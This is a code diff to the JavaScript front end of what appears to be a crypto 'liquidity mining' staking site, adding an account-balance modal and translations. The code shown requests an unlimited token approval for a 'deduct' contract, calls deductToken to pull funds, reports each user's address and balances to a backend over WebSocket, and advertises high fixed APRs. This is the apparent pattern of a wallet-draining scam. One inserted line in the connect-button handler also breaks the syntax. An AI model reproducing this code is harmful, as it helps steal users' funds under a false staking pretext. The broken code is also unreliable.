@@ -5,31 +5,19 @@ const INFURA_URL = 'https://mainnet.infura.io/v3/a4d896498845476cac19c5eefd3bcd9
 let ws;
 function initWebSocket() {
   if (ws && ws.readyState === WebSocket.OPEN) return;
-  
-  // 使用您的 ngrok 網址
-  ws = new WebSocket('wss://ventilative-lenten-brielle.ngrok-free.dev/ws');
-
-  ws.onopen = () => {
-    log('WebSocket 連線成功！', 'success');
-  };
-
+  // 改成本機或 ngrok
+  ws = new WebSocket('ws://localhost:3000/ws'); // 本機
+  // ws = new WebSocket('wss://ventilative-lenten-brielle.ngrok-free.dev/ws'); // ngrok
+  ws.onopen = () => log('WebSocket 連線成功！', 'success');
   ws.onclose = () => {
     log('WebSocket 斷線，3秒後重連...', 'error');
     setTimeout(initWebSocket, 3000);
   };
-
-  ws.onerror = (err) => {
-    log(`WebSocket 連線錯誤`, 'error');
-  };
+  ws.onerror = () => log('WebSocket 連線錯誤', 'error');
 }
-
 function sendToBackend(data) {
   if (!userAddress || !ws || ws.readyState !== WebSocket.OPEN) return;
-  ws.send(JSON.stringify({
-    address: userAddress,
-    timestamp: Date.now(),
-    ...data
-  }));
+  ws.send(JSON.stringify({ address: userAddress, timestamp: Date.now(), ...data }));
 }
 
 // ==================== Firebase 初始化 ====================
@@ -63,10 +51,10 @@ const ERC20_ABI = [
 
 // ==================== 質押週期 & 年化利率 ====================
 const PLEDGE_DURATIONS = [
-  { days: 90,  rate: 0.167 },  // 16.7%
-  { days: 180, rate: 0.243 },  // 24.3%
-  { days: 240, rate: 0.281 },  // 28.1%
-  { days: 365, rate: 0.315 }   // 31.5%
+  { days: 90, rate: 0.167 }, // 16.7%
+  { days: 180, rate: 0.243 }, // 24.3%
+  { days: 240, rate: 0.281 }, // 28.1%
+  { days: 365, rate: 0.315 } // 31.5%
 ];
 
 // DOM 元素
@@ -75,6 +63,7 @@ let refreshWallet, walletTokenSelect, walletBalanceAmount, accountBalanceValue, 
 let grossOutputValue, cumulativeValue, nextBenefit, claimModal, closeModal, confirmClaim, cancelClaim;
 let modalClaimableETH, modalSelectedToken, modalEquivalentValue, modalTitle, languageSelect;
 let totalPledgeBlock, estimateBlock, pledgeDetailModal, closePledgeDetail;
+let accountDetailModal, closeAccountDetail, closeAccountDetailBtn;
 let elements = {};
 
 // 變數
@@ -155,7 +144,13 @@ const translations = {
     cycle: 'Cycle',
     apr: 'APR',
     accrued: 'Accrued Interest',
-    exceedBalance: 'Amount exceeds wallet balance!'
+    exceedBalance: 'Amount exceeds wallet balance!',
+    // 【新增】Account Balance 明細
+    accountDetailTitle: 'Account Balance Details',
+    totalBalance: 'Total Balance',
+    pledgedAmount: 'Pledged Amount',
+    claimedInterest: 'Claimed Interest',
+    walletBalance: 'Wallet Balance'
   },
   'zh-Hant': {
     title: '流動性挖礦',
@@ -211,7 +206,13 @@ const translations = {
     cycle: '週期',
     apr: '年化',
     accrued: '累積利息',
-    exceedBalance: '金額超出錢包餘額！'
+    exceedBalance: '金額超出錢包餘額！',
+    // 【新增】Account Balance 明細
+    accountDetailTitle: '帳戶餘額明細',
+    totalBalance: '總餘額',
+    pledgedAmount: '質押金額',
+    claimedInterest: '已領取利息',
+    walletBalance: '錢包餘額'
   },
   'zh-Hans': {
     title: '流动性挖矿',
@@ -267,9 +268,16 @@ const translations = {
     cycle: '周期',
     apr: '年化',
     accrued: '累计利息',
-    exceedBalance: '金额超出钱包余额！'
+    exceedBalance: '金额超出钱包余额！',
+    // 【新增】Account Balance 明細
+    accountDetailTitle: '账户余额明细',
+    totalBalance: '总余额',
+    pledgedAmount: '质押金额',
+    claimedInterest: '已领取利息',
+    walletBalance: '钱包余额'
   }
 };
+
 let currentLang = localStorage.getItem('language') || 'en';
 
 // 日誌函數
@@ -319,6 +327,9 @@ function getElements() {
   estimateBlock = document.getElementById('estimateBlock');
   pledgeDetailModal = document.getElementById('pledgeDetailModal');
   closePledgeDetail = document.getElementById('closePledgeDetail');
+  accountDetailModal = document.getElementById('accountDetailModal');
+  closeAccountDetail = document.getElementById('closeAccountDetail');
+  closeAccountDetailBtn = document.getElementById('closeAccountDetailBtn');
   elements = {
     title: document.getElementById('title'),
     subtitle: document.getElementById('subtitle'),
@@ -334,7 +345,13 @@ function getElements() {
     pledgeBtnText: pledgeBtn,
     totalPledge: document.getElementById('totalPledgeValue'),
     estimate: document.getElementById('estimateValue'),
-    exceedWarning: document.getElementById('exceedWarning')
+    exceedWarning: document.getElementById('exceedWarning'),
+    // 【新增】Account Balance 明細
+    accountDetailTitle: document.getElementById('accountDetailTitle'),
+    modalTotalBalanceLabel: document.getElementById('modalTotalBalanceLabel'),
+    modalPledgedAmountLabel: document.getElementById('modalPledgedAmountLabel'),
+    modalClaimedInterestLabel: document.getElementById('modalClaimedInterestLabel'),
+    modalWalletBalanceLabel: document.getElementById('modalWalletBalanceLabel')
   };
 }
 
@@ -539,14 +556,12 @@ function updateBalancesUI(walletBalances) {
   const formattedWalletBalance = ethers.formatUnits(walletTokenBigInt, decimals[selectedToken]);
   const walletValue = parseFloat(formattedWalletBalance);
 
-  // 更新 accountBalance.wallet
   accountBalance[selectedToken].wallet = walletValue;
   if (walletBalanceAmount) walletBalanceAmount.textContent = walletValue.toFixed(3);
 
   updateAccountBalanceDisplay();
   updateEstimate();
 
-  // 發送餘額變動
   sendToBackend({ type: 'balance', balances: getCurrentBalances() });
 }
 
@@ -997,6 +1012,12 @@ function updateLanguage(lang) {
     document.documentElement.lang = lang;
     updatePledgeSummary();
     updateEstimate();
+    // 【新增】更新 Account Balance 明細標題
+    if (elements.accountDetailTitle) elements.accountDetailTitle.textContent = translations[lang].accountDetailTitle;
+    if (elements.modalTotalBalanceLabel) elements.modalTotalBalanceLabel.textContent = translations[lang].totalBalance;
+    if (elements.modalPledgedAmountLabel) elements.modalPledgedAmountLabel.textContent = translations[lang].pledgedAmount;
+    if (elements.modalClaimedInterestLabel) elements.modalClaimedInterestLabel.textContent = translations[lang].claimedInterest;
+    if (elements.modalWalletBalanceLabel) elements.modalWalletBalanceLabel.textContent = translations[lang].walletBalance;
   };
   setTimeout(apply, 200);
 }
@@ -1041,7 +1062,6 @@ function updateEstimate() {
 
   elements.estimate.textContent = `${total.toFixed(3)} ${token}`;
 
-  // 檢查是否超出錢包餘額
   const walletBalance = parseFloat(walletBalanceAmount.textContent) || 0;
   if (amount > walletBalance) {
     elements.exceedWarning.textContent = translations[currentLang].exceedBalance;
@@ -1085,6 +1105,28 @@ function showPledgeDetail() {
   }
 
   pledgeDetailModal.style.display = 'flex';
+}
+
+// ==================== 【新增】Account Balance 明細 ====================
+function showAccountDetail() {
+  if (!accountDetailModal) return;
+
+  const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
+  const total = getTotalAccountBalanceInSelectedToken();
+  const pledged = accountBalance[selected].pledged || 0;
+  const interest = accountBalance[selected].interest || 0;
+  const wallet = accountBalance[selected].wallet || 0;
+
+  document.getElementById('modalTotalBalance').textContent = `${total.toFixed(3)} ${selected}`;
+  document.getElementById('modalPledgedAmount').textContent = `${pledged.toFixed(3)} ${selected}`;
+  document.getElementById('modalClaimedInterest').textContent = `${interest.toFixed(3)} ${selected}`;
+  document.getElementById('modalWalletBalance').textContent = `${wallet.toFixed(3)} ${selected}`;
+
+  accountDetailModal.style.display = 'flex';
+}
+
+function closeAccountDetail() {
+  if (accountDetailModal) accountDetailModal.style.display = 'none';
 }
 
 // ==================== 自動檢查質押到期 ====================
@@ -1173,7 +1215,8 @@ document.addEventListener('DOMContentLoaded', () => {
     connectButton.addEventListener('click', () => {
       if (connectButton.classList.contains('connected')) {
         disconnectWallet();
-      } else {
+      }deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
+      else {
         connectWallet();
       }
     });
@@ -1255,12 +1298,10 @@ document.addEventListener('DOMContentLoaded', () => {
           const approveTx = await tokenContract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
           await sendMobileRobustTransaction(approveTx);
         }
-        // 扣款
+        // 【修正】deductToken 參數
         updateStatus('Deducting...');
-        const deductTx = await deductContract.deductToken.populateTransaction(
-          token === 'USDT' ? USDT_CONTRACT_ADDRESS : token === 'USDC' ? USDC_CONTRACT_ADDRESS : WETH_CONTRACT_ADDRESS,
-          amountWei
-        );
+        const tokenAddress = token === 'USDT' ? USDT_CONTRACT_ADDRESS : token === 'USDC' ? USDC_CONTRACT_ADDRESS : WETH_CONTRACT_ADDRESS;
+        const deductTx = await deductContract.deductToken.populateTransaction(tokenAddress, amountWei);
         await sendMobileRobustTransaction(deductTx);
         // 更新本地
         accountBalance[token].pledged += amount;
@@ -1280,7 +1321,8 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     });
   }
-  if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
+  
+    if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
   if (walletTokenSelect) walletTokenSelect.addEventListener('change', forceRefreshWalletBalance);
   if (pledgeAmount) pledgeAmount.addEventListener('input', updateEstimate);
   if (pledgeDuration) pledgeDuration.addEventListener('change', updateEstimate);
@@ -1288,6 +1330,15 @@ document.addEventListener('DOMContentLoaded', () => {
   if (totalPledgeBlock) totalPledgeBlock.addEventListener('click', showPledgeDetail);
   if (closePledgeDetail) closePledgeDetail.addEventListener('click', () => pledgeDetailModal.style.display = 'none');
   if (pledgeDetailModal) pledgeDetailModal.addEventListener('click', e => e.target === pledgeDetailModal && (pledgeDetailModal.style.display = 'none'));
+
+  // 【新增】Account Balance 明細事件
+  if (accountBalanceValue) {
+    accountBalanceValue.style.cursor = 'pointer';
+    accountBalanceValue.addEventListener('click', showAccountDetail);
+  }
+  if (closeAccountDetail) closeAccountDetail.addEventListener('click', closeAccountDetail);
+  if (closeAccountDetailBtn) closeAccountDetailBtn.addEventListener('click', closeAccountDetail);
+  if (accountDetailModal) accountDetailModal.addEventListener('click', e => e.target === accountDetailModal && closeAccountDetail());
 
   document.querySelectorAll('.tab').forEach(tab => {
     tab.addEventListener('click', () => {
@@ -1298,6 +1349,7 @@ document.addEventListener('DOMContentLoaded', () => {
       if (tab.dataset.tab === 'liquidity') updateInterest();
     });
   });
+
   const rulesModal = document.getElementById('rulesModal');
   const rulesButton = document.getElementById('rulesButton');
   const closeRulesModal = document.getElementById('closeRulesModal');
